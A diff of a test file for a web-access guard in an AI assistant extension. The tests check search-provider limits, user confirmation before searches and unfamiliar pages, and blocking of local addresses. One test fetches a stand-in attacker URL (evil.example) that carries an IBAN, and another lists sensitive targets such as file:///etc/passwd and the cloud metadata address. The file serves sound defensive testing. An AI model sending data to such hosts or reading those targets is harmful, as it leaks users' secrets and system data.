@@ -10,13 +10,13 @@ import { join } from "node:path";
 import { test } from "node:test";
 import { fileURLToPath } from "node:url";
 
-const { DECLARATIONS, SETTINGS, leanDeclarations, repairQueries, writeSettings } = await import("../index.ts");
+const { DECLARATIONS, SETTINGS, WEB_DECLINED_REASON, WEB_NO_ONE_TO_ASK_REASON, addressesIn, leanDeclarations, localAddress, repairQueries, webAskText, webGuard, writeSettings } = await import("../index.ts");
 const here = fileURLToPath(new URL(".", import.meta.url));
 const extension = join(here, "..", "index.ts");
 
-test("search goes only to Exa, then DuckDuckGo; never OpenAI, even with a ChatGPT sign-in", () => {
-	assert.deepEqual(SETTINGS.searchRouting.providers, ["exa", "duckduckgo"]);
-	assert.deepEqual(SETTINGS.webSearch.allowedProviders, ["exa", "duckduckgo"]);
+test("search goes only to DuckDuckGo, as the privacy policy says; never OpenAI, even with a ChatGPT sign-in", () => {
+	assert.deepEqual(SETTINGS.searchRouting.providers, ["duckduckgo"]);
+	assert.deepEqual(SETTINGS.webSearch.allowedProviders, ["duckduckgo"]);
 	assert.deepEqual(SETTINGS.openaiSearchProviders, []);
 	assert.equal(SETTINGS.fetchRouting.allowRemoteHostedProviders, false);
 	assert.equal(SETTINGS.allowBrowserCookies, false);
@@ -56,6 +56,71 @@ test("the model sees short web declarations; other tools, other payloads and a s
 	const anthropic = leanDeclarations({ tools: [{ name: "fetch_content", description: "long", input_schema: long }] });
 	assert.equal(anthropic.tools[0].input_schema, DECLARATIONS.fetch_content.parameters);
 	assert.equal(leanDeclarations({ messages: [] }), undefined);
+});
+
+/** A UI that answers every question with `answer` and remembers what it was asked. */
+function ui(answer) {
+	const asked = [];
+	return { asked, ctx: { hasUI: true, ui: { confirm: async (title, message) => { asked.push({ title, message }); return answer; } } } };
+}
+
+test("the first search of an answer asks with the exact search text; later ones in the same answer run", async () => {
+	const guard = webGuard();
+	guard.agentStart();
+	const { asked, ctx } = ui(true);
+	assert.equal(await guard.toolCall({ toolName: "web_search", input: { queries: ["Wetter Köln morgen", "Regenradar Köln"] } }, ctx), undefined);
+	assert.equal(asked.length, 1);
+	assert.match(asked[0].message, /Wetter Köln morgen/);
+	assert.match(asked[0].message, /Regenradar Köln/);
+	assert.equal(await guard.toolCall({ toolName: "web_search", input: { query: "Wetter Bonn" } }, ctx), undefined);
+	assert.equal(asked.length, 1, "allowed once per answer");
+	guard.agentEnd();
+	guard.agentStart();
+	await guard.toolCall({ toolName: "web_search", input: { query: "Wetter Bonn" } }, ctx);
+	assert.equal(asked.length, 2, "a new answer asks again");
+});
+
+test("a declined search, or no one to ask, sends nothing", async () => {
+	const guard = webGuard();
+	guard.agentStart();
+	assert.deepEqual(await guard.toolCall({ toolName: "web_search", input: { query: "x" } }, ui(false).ctx), { block: true, reason: WEB_DECLINED_REASON });
+	assert.deepEqual(await guard.toolCall({ toolName: "web_search", input: { query: "x" } }, {}), { block: true, reason: WEB_NO_ONE_TO_ASK_REASON });
+});
+
+test("pages from the person's message or this answer's search results are read without asking; others are asked for", async () => {
+	const guard = webGuard();
+	guard.input({ text: "Was steht auf https://www.verbraucherzentrale.de/kuendigung?" });
+	guard.agentStart();
+	const { asked, ctx } = ui(true);
+	assert.equal(await guard.toolCall({ toolName: "fetch_content", input: { url: "https://www.verbraucherzentrale.de/kuendigung" } }, ctx), undefined);
+	await guard.toolCall({ toolName: "web_search", input: { query: "Kündigung Fitnessstudio" } }, ctx);
+	guard.toolResult({ toolName: "web_search", content: [{ type: "text", text: "1. Ratgeber\n   https://example.org/ratgeber/kuendigen.\n" }] });
+	assert.equal(await guard.toolCall({ toolName: "fetch_content", input: { urls: ["https://example.org/ratgeber/kuendigen"] } }, ctx), undefined);
+	assert.equal(asked.length, 1, "only the search was asked");
+	assert.equal(await guard.toolCall({ toolName: "fetch_content", input: { url: "https://evil.example/c?iban=DE89370400440532013000" } }, ctx), undefined);
+	assert.equal(asked.length, 2);
+	assert.match(asked[1].message, /evil\.example/);
+	const no = ui(false);
+	assert.deepEqual(await guard.toolCall({ toolName: "fetch_content", input: { url: "https://evil.example/other" } }, no.ctx), { block: true, reason: WEB_DECLINED_REASON });
+});
+
+test("this Mac and its local network are never read, whatever the model says", async () => {
+	for (const url of ["http://localhost:8080/", "http://127.0.0.1:41234/mcp", "http://192.168.1.1/", "http://10.0.0.2", "http://172.20.0.1",
+		"http://169.254.169.254/latest", "http://[::1]/", "http://drucker.local/", "file:///etc/passwd", "ftp://example.org/x"]) {
+		assert.ok(localAddress(url), url);
+		const guard = webGuard();
+		guard.input({ text: url });
+		guard.agentStart();
+		const result = await guard.toolCall({ toolName: "fetch_content", input: { url } }, ui(true).ctx);
+		assert.equal(result?.block, true, url);
+	}
+	for (const url of ["https://www.tagesschau.de/", "https://172.32.0.1/", "https://example.org/a"]) assert.equal(localAddress(url), undefined, url);
+});
+
+test("addresses are taken from text without trailing punctuation; questions are in the app's language", () => {
+	assert.deepEqual(addressesIn("Siehe https://a.example/x. Und (https://b.example/y)!"), ["https://a.example/x", "https://b.example/y"]);
+	assert.equal(webAskText("search", ["a"], "de").title, "Darf Pippa im Internet suchen?");
+	assert.equal(webAskText("page", ["https://a.example/x"], "en").title, "May Pippa open this web page?");
 });
 
 /** Starts the real Pi with index.ts and a probe extension that reports what Pi sees at session start. */
